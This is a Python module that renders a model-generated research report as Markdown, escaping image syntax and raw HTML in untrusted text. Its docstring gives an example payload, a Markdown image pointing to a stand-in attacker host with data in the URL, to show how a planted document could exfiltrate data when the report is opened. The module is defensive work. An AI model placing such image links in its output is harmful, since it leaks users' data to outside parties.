"""Render a finished research report as Markdown.

All text that came from a model or a document is untrusted. Before it goes into
Markdown, image syntax and raw HTML are neutralised: a document could otherwise
plant ``![x](https://attacker.example/?data=...)``, and a viewer that loads
images would send data to the attacker when the report is opened.
"""

import re
from typing import Any

_IMAGE = re.compile(r"!\[")
_HTML = re.compile(r"[<>]")


def safe(text: str) -> str:
    text = _IMAGE.sub(r"!\\[", text)
    return _HTML.sub(lambda m: "&lt;" if m.group(0) == "<" else "&gt;", text)


def _location(citation: dict[str, Any]) -> str:
    page = f", page {citation['page']}" if citation.get("page") else ""
    return f"{safe(citation['filename'])}{page}"


def render_report(question: str, report: dict[str, Any]) -> str:
    lines = [f"# {safe(question)}", ""]
    if report["status"] != "answered":
        lines += ["**No answer:** " + safe(report["summary"]), ""]
    else:
        lines += [safe(report["summary"]), "", "## Findings", ""]
        for number, claim in enumerate(report["claims"], start=1):
            refs = ", ".join(f"[{c['id']}]" for c in claim["citations"])
            note = " (partially supported)" if claim["verdict"] == "partially_supported" else ""
            lines.append(f"{number}. {safe(claim['text'])} {refs}{note}")
        lines += ["", "## Evidence", ""]
        seen: set[str] = set()
        for claim in report["claims"]:
            for citation in claim["citations"]:
                if citation["id"] in seen:
                    continue
                seen.add(citation["id"])
                quote = " ".join(citation["quote"].split())
                lines += [
                    f"**[{citation['id']}]** {_location(citation)}",
                    "",
                    f"> {safe(quote)}",
                    "",
                ]
    if report.get("not_found"):
        lines += ["## Not found in the documents", "", safe(report["not_found"]), ""]
    if report.get("rejected_claims"):
        lines += ["## Claims removed by verification", ""]
        for claim in report["rejected_claims"]:
            lines.append(
                f"- {safe(claim['text'])} ({claim['verdict']}: {safe(claim['rationale'])})"
            )
        lines.append("")
    stats = report["stats"]
    lines += [
        "---",
        "",
        f"{stats['quotes_verified']} quotes verified against the source text, "
        f"{stats['quotes_rejected']} rejected; {stats['claims_checked']} claims checked, "
        f"{stats['claims_rejected']} removed.",
        "",
    ]
    return "\n".join(lines)
